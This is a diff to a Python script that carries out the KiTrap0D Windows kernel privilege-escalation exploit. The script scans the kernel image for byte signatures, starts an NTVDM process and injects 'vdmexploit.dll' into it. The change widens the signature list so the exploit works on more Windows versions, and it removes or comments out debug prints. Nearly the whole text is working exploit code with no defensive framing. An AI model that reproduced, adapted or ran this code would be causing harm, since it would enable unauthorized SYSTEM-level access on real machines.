@@ -1,6 +1,13 @@
 import ctypes
 import dllinject
 import ctypes.wintypes as wintypes
+signatures = ("\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00",
+              "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00",
+              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84",
+              "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00",
+              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00",
+              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00",
+              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00")
 def get_kernel_addr():
     ntdll = ctypes.windll.ntdll
     buffer_size = wintypes.ULONG(0)
@@ -38,7 +45,6 @@ def kitrap0d():
 
     kernbase, kernimage, kernsize = get_kernel_addr()
     kernhandle = kernel32.LoadLibraryA(kernimage)
-    xpsig = "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84"
     dos_header = ctypes.cast(kernhandle, ctypes.POINTER(wintypes.IMAGE_DOS_HEADER))
     nt_header = ctypes.cast(kernhandle + dos_header.contents.e_lfanew, ctypes.POINTER(wintypes.IMAGE_NT_HEADER))
     optional_header = nt_header.contents.OptionalHeader
@@ -48,8 +54,8 @@ def kitrap0d():
     
     kernelarray = ctypes.cast(kernhandle, ctypes.POINTER(buf)).contents
     for i in range(baseofcode, sizeofcode+1):
-        chunk = ''.join([chr(j%256) for j in kernelarray[i:i+len(xpsig)]])
-        if chunk == xpsig:
+        chunk = ''.join([chr(j%256) for j in kernelarray[i:i+16]])
+        if chunk in signatures:
             break
     kernoff = i
     
@@ -77,7 +83,6 @@ def kitrap0d():
                             ctypes.byref(startupinfo),
                             ctypes.byref(process_information)
                             )
-    print kernel32.GetLastError()
     ntvdm = kernel32.OpenProcess(
                         0x43b,
                         False,
@@ -86,4 +91,4 @@ def kitrap0d():
     kernel32.CloseHandle(process_information.hThread)
     kernel32.CloseHandle(process_information.hProcess)
     ntvdminject = dllinject.Process(handle=ntvdm)
-    print ntvdminject.inject("vdmexploit.dll")
+    #print ntvdminject.inject("vdmexploit.dll")
